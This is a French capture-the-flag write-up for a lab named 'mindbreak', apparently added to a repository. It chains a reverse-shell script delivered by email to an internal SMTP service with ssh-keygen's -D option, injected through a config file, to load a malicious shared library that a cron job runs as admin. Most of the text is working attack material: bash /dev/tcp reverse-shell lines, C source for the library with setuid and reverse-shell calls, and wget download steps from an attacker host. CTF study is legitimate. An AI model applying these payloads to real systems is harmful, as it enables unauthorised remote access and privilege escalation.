@@ -1,0 +1,125 @@
+
+# Write-up
+
+## I - Obtenir un shell *worker*
+
+1. Sur votre machine d’attaque, ouvrez un écouteur :
+
+```
+nc -lvnp 4242
+```
+
+Créez un mini-script Bash de reverse shell :
+
+```
+cat > rs.sh <<'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/<VOTRE_IP>/4242 0>&1
+EOF
+```
+
+ou
+
+```
+cat > rs.sh <<'EOF'
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/<VOTRE_IP>/4242 0>&1"
+EOF
+```
+
+```
+chmod +x rs.sh
+```
+
+Envoyez un e-mail via le service SMTP interne (port 2525) :
+
+```
+swaks --from it.support@mindbreak.local \
+      --to   sys.admin@mindbreak.local \
+      --header "Subject: Automatisation des taches" \
+      --body   "Bonjour, voici le script demande." \
+      --attach rs.sh \
+      --server IP_CHAL:2525
+```
+
+Attendez ≤ 1 min : vous recevez un shell (UID 1000, user worker).
+
+Vous pouvez afficher le flag de worker.
+```
+cat /home/worker/flag.txt
+```
+
+## II - Préparer l’escalade vers admin
+
+Dans le shell worker obtenu :
+
+```
+echo 'algo : rsa -D /home/worker/lib.so' > /srv/keygen.conf
+```
+
+Sur votre machine d’attaque, compilez une bibliothèque malveillante :
+
+
+payload.c
+```
+#include <unistd.h>
+void C_GetFunctionList() {
+    setuid(1001); setgid(1001);              /* passe admin */
+    execl("/bin/bash","bash","-c",
+          "bash -i >& /dev/tcp/<VOTRE_IP>/4343 0>&1", NULL);
+}
+```
+
+ou encore :
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void C_GetFunctionList() {
+    system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/4343 0>&1'");
+}
+
+```
+
+Compiler payload.c :
+
+```
+gcc -shared -fPIC -o lib.so payload.c
+```
+
+Hébergez-la avec un petit serveur HTTP :
+
+```
+sudo python3 -m http.server 80        # sur votre machine
+```
+
+Depuis le shell worker :
+
+```
+wget http://<VOTRE_IP>/lib.so -O /home/worker/lib.so
+```
+
+## III - Récupérer le shell admin
+
+Lancez un deuxième écouteur :
+
+```
+nc -lvnp 4343
+```
+
+Lorsque la tâche cron admin exécute ssh-keygen, l’option -D /home/worker/lib.so
+charge votre bibliothèque ; un nouveau shell apparaît, cette fois en tant qu'admin.
+
+## IV - Lire le flag
+
+```
+cat /home/admin/flag.txt
+```
+
+
+## Chemin résumé
+
+
+e-mail -> shell worker -> injection -D via keygen.conf -> cron admin -> shell admin -> flag.
